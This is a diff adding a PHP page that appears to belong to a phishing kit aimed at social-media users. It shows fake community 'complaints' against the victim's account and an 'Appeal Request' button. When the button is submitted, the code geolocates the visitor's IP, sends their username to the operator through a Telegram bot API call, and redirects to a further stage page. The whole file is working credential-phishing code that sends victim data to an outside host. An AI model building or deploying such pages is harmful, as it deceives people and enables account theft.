@@ -1,0 +1,226 @@
+<?php
+ob_start();
+session_start();
+set_time_limit(0);
+error_reporting(0);
+
+if ($_POST) {
+    $fore_user = $_SESSION["fore_user"];
+    $ip = $_SERVER["REMOTE_ADDR"];
+    $konum = file_get_contents("http://ip-api.com/xml/" . $ip);
+    $cek = new SimpleXMLElement($konum);
+    $ulke = $cek->country;
+    $sehir = $cek->city;
+    $site = $_SERVER["SERVER_NAME"];
+    date_default_timezone_set('Europe/Istanbul');
+    $cur_time = date("d-m-Y H:i:s");
+    require_once("admin/tg.php");
+    header("Location:3.php?$fore_user");
+
+    $data = [
+        'text' => '
+ '. $fore_user .' Şikayetleri İnceledi...
+  
+',
+        'chat_id' => "$chatid"
+    ];
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
+
+
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/style-sikayet.css">
+    <title>Complaints <?php $fore_user = $_SESSION["fore_user"];
+                                            echo $fore_user; ?></title>
+</head>
+
+<body>
+    <center>
+
+    </center>
+    <div class="copix">
+        <!-- <img width="100%" height="450" src="imgs/sls.gif" autoplay muted loop> -->
+        <div class="yazix">
+
+            <div class='forezny-overflow'>
+                <div class="main-content" style="margin-top: 10px" bis_skin_checked="1">
+                    <div class="comments_face" bis_skin_checked="1">
+                        <div class="comments" bis_skin_checked="1">
+
+
+                            <p style="margin:0;padding:0;float:left;display:block;width:50%">
+                             <span style="color: #000000;font-size: 1.1rem;float: left;margin-left: 5px;font-weight: 600;">Complaints</span>
+
+
+                        <span style="color: #00000073;font-size: 1.0rem;float:right;font-weight: 550;margin-right: -20vh;">5/83 <i class="fas fa-angle-down" style="font-size:18px"></i></span>
+
+                                <br>
+                            </p> 
+                                
+                    
+                            <div style="clear:both" bis_skin_checked="1">
+                            </div>
+                        </div>
+                        
+                        <div class="detail_block" bis_skin_checked="1">
+                            <div class="detail_left" bis_skin_checked="1"><img src="https://263cdn.com/upload/yhde1.jpg"></div>
+                            <div class="detail_right" bis_skin_checked="1">
+                                <h3>
+                                    <div class="comm_name" bis_skin_checked="1">G***** D****</div>
+                                </h3>
+                                <p>This account uses artificial likes and followers. disable this account. <br> Username: <b>@<?php $fore_user = $_SESSION["fore_user"];
+                                            echo $fore_user; ?></b></p>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                    </svg></div>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                </div> <span>5 minutes ago</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="detail_block" bis_skin_checked="1">
+                            <div class="detail_left" bis_skin_checked="1"><img src="https://263cdn.com/upload/yhde7.jpg"></div>
+                            <div class="detail_right" bis_skin_checked="1">
+                                <h3>
+                                    <div class="comm_name" bis_skin_checked="1">M**** K******</div>
+                                </h3>
+                                <p> Hello support team!<br>
+                                    The <b>@<?php $fore_user = $_SESSION["fore_user"];
+                                            echo $fore_user; ?></b> account is posting content that violates the community guidelines. Please review and take necessary action.</p>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                    </svg></div>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                </div> <span>14 minutes ago</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="detail_block" bis_skin_checked="1">
+                            <div class="detail_left" bis_skin_checked="1"><img src="https://263cdn.com/upload/yhde8.jpg"></div>
+                            <div class="detail_right" bis_skin_checked="1">
+                                <h3>
+                                    <div class="comm_name" bis_skin_checked="1">A**** B*****</div>
+                                </h3>
+                                <p>Hello customer service!<br> I think <b>@<?php $fore_user = $_SESSION["fore_user"];
+                                                                            echo $fore_user; ?></b> account is breaking the rules. please review this.</p>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                    </svg></div>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                </div> <span>1 hour ago</span>
+                                </span>
+                            </div>
+                        </div>
+
+                        <div class="detail_block" bis_skin_checked="1">
+                            <div class="detail_left" bis_skin_checked="1"><img src="https://263cdn.com/upload/yhde3.jpg"></div>
+                            <div class="detail_right" bis_skin_checked="1">
+                                <h3>
+                                    <div class="comm_name" bis_skin_checked="1">K****** M*****</div>
+                                </h3>
+                                <p>The <b>@<?php $fore_user = $_SESSION["fore_user"];
+                                            echo $fore_user; ?></b> account is posting malicious content. please delete this account.</p>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                    </svg></div>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                </div> <span>4 hours ago</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="detail_block" bis_skin_checked="1">
+                            <div class="detail_left" bis_skin_checked="1"><img src="https://263cdn.com/upload/yhde4.jpg"></div>
+                            <div class="detail_right" bis_skin_checked="1">
+                                <h3>
+                                    <div class="comm_name" bis_skin_checked="1">F***** Z*****</div>
+                                </h3>
+                                <p>Hello Team. The account below is scamming people. Please disable it. Thanks. <br>Account name: <b>@<?php $fore_user = $_SESSION["fore_user"];
+                                            echo $fore_user; ?></b>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                    </svg></div>
+                                <div class="fbblue smaller" href="javascript:void(0);" bis_skin_checked="1">
+
+                                </div> <span>1 day ago</span>
+
+                                </span>
+
+                            </div>
+
+                        </div>
+                         <br> <br>
+ <span style="color: #a7a7a7;font-size: 1.0rem;font-weight: 500;">There are only unexamined complaints on this page. </span>
+
+                 
+                    </div>
+
+                    <div class="foreznykutusikayet">
+                    
+
+
+                           
+                    </div>
+                </div>
+
+                <div class="btn-area">
+                    <br>
+                       <span style="color: #858484;font-size: 1.0rem;font-weight: 500;">Click on the appeal request to continue.</span>
+           <form method="post">
+                            <button type="submit" id="bttn" class="btn3" name="fore_user">Appeal Request @<?php $fore_user = $_SESSION["fore_user"];
+                                            echo $fore_user; ?></button>
+                                
+         </form>
+                </div>
+            </div>
+                
+        
+             <center>
+        <div class="alt"><br>
+        <img width="150" src="imgs/ehe.png" alt="">
+        <br><br>
+        <p>To protect our community, we attach great importance to complaints and community rules and notify the user who has any complaints on their account.</p>
+        <br><br>
+    </div>
+    </center>
+    <div class="enalt"> <br><br>
+    <div class="enaltig">
+        
+        </div> 
+
+        <div class="linksx">
+        <a href="#">Community Standarts</a> &nbsp;&nbsp; | &nbsp;&nbsp;
+        <a href="#">Data Policy</a> <br><br>
+        <a href="#">Terms</a> 
+         &nbsp;&nbsp; | &nbsp;&nbsp;
+        <a href="#">Cookie Policy</a>
+        </div>
+                <br><hr color="#E0E0E0" size="0.1px" width="90%">
+        <br>
+        <div class="dil">
+        <p>Language English (US)</p>
+        </div>
+        <br>
+    </div>
+
+ <script src="jquery-3.6.0.js" ></script>
+<script>
+        $( "form" ).submit(function( event ) {
+            $( "#bttn" ).html("<i id='loader' class='fa fa-spinner fa-spin'></i>");
+        });
+    </script> 
+</body>
+</html> 
